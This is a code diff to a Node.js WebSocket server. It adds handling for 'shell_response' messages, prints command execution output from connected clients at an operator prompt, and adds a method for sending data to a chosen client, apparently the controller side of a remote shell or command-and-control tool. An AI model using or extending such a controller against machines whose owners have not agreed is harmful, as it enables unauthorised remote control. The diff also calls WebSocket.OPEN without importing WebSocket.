@@ -1,6 +1,7 @@
 import { WebSocketServer } from "ws";
 import Logger from "./logger.js";
 import crypto from "crypto";
+// import colors from "colors";
 
 class WSServer {
   constructor(httpServer) {
@@ -45,14 +46,23 @@ class WSServer {
 
   handleMessage(ws, message) {
     try {
-      const data = JSON.parse(message);
-      if (data.type === "identify") {
-        this.handleIdentify(ws, data);
+      const data = JSON.parse(message.toString());
+      Logger.info(`Received message type: ${data.type}`);
+      
+      switch (data.type) {
+        case "identify":
+          this.handleIdentify(ws, data);
+          break;
+        case "shell_response":
+          this.handleShellResponse(ws, data);
+          break;
+        default:
+          Logger.info(`Broadcasting message: ${message}`);
+          this.broadcast(message);
       }
     } catch (e) {
-      Logger.info(`Received encrypted message payload`);
+      Logger.info(`Received malformed message payload`);
     }
-    this.broadcast(message);
   }
 
   handleIdentify(ws, data) {
@@ -74,6 +84,37 @@ class WSServer {
     Logger.success(`Client "${id}" (${clientInfo.shortId}) authenticated from ${clientInfo.ip}${details}`);
   }
 
+  handleShellResponse(ws, data) {
+    const clientInfo = this.clients.get(ws);
+    if (!clientInfo) return;
+
+    const colors = {
+      reset: "\x1b[0m",
+      blue: "\x1b[34m",
+      cyan: "\x1b[36m",
+      yellow: "\x1b[33m",
+      green: "\x1b[32m",
+      red: "\x1b[31m"
+    };
+
+    console.log(`\n${colors.blue}Command Execution Results:${colors.reset}\n`);
+    console.log(`${colors.yellow}Client:${colors.reset} ${clientInfo.shortId} (${clientInfo.id})`);
+    console.log(`${colors.yellow}Status:${colors.reset} ${data.success ? colors.green + "Success" + colors.reset : colors.red + "Failed" + colors.reset}`);
+    
+    if (data.error) {
+      console.log(`\n${colors.red}Error:${colors.reset}`);
+      console.log(data.error);
+    }
+
+    if (data.output) {
+      console.log(`\n${colors.cyan}Output:${colors.reset}`);
+      console.log(data.output);
+    }
+    
+    console.log(""); // Empty line for better readability
+    process.stdout.write("> "); // Display the prompt after command output
+  }
+
   handleClose(ws) {
     const clientInfo = this.clients.get(ws);
     Logger.warn(`Client session "${clientInfo.id}" (${clientInfo.shortId}) terminated from ${clientInfo.ip}`);
@@ -90,6 +131,22 @@ class WSServer {
         client.send(message);
       }
     });
+  }
+
+  sendToClient(targetId, data) {
+    console.log("[>] Attempting to send to client:", targetId);
+    console.log("[>] Data:", data);
+    
+    for (const [ws, info] of this.clients.entries()) {
+      if ((info.id === targetId || info.shortId === targetId) && ws.readyState === WebSocket.OPEN) {
+        const messageStr = JSON.stringify(data);
+        console.log("[>] Sending message:", messageStr);
+        ws.send(messageStr);
+        return true;
+      }
+    }
+    console.log("[!] Client not found or not connected:", targetId);
+    return false;
   }
 
   getWSS() {
